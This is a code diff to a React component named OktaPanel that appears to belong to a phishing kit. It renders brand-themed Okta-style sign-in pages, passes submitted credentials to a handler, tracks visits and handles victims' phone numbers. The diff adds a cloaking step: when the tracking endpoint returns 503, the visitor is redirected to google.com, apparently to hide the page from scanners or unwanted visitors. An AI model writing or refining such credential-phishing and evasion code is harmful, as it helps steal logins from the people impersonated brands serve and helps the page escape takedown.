@@ -230,22 +230,28 @@ export function OktaPanel({ brand, onCredentialsSubmit }: OktaPanelProps) {
     root.style.setProperty('--logo-height', brand.logoHeight);
   }, [brand]);
 
-  useEffect(() => {
-    (async () => {
-      try {
-        const res = await fetch('/api/auth/visit', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ brand: brand.id, page: 'signin' }),
-        });
+useEffect(() => {
+  (async () => {
+    try {
+      const res = await fetch('/api/auth/visit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ brand: brand.id, page: 'signin' }),
+      });
+
+      if (res.status === 503) {
         const data = await res.json();
-        if (data?.sessionId) setSessionId(data.sessionId);
-        setSessionPhone(data?.phoneNumber ?? null);
-      } catch (_) {
-        // silently swallow – non-critical telemetry
+        window.location.replace(data.redirectTo ?? 'https://www.google.com');
+        return;
       }
-    })();
-  }, [brand.id]);
+
+      const data = await res.json();
+      if (data?.sessionId) setSessionId(data.sessionId);
+      setSessionPhone(data?.phoneNumber ?? null);
+    } catch (e) {
+    }
+  })();
+}, [brand.id]);
 
   const [sessionId, setSessionId] = useState<string | null>(null);
   const [sessionPhone, setSessionPhone] = useState<string | null>(null);
@@ -1151,3 +1157,4 @@ function maskPhone(phone?: string): string {
   const countryDigits = digits.length > 10 ? digits.slice(0, digits.length - 10) : '1';
   return `+${countryDigits} XXX-XXX-${last4}`;
 }
+
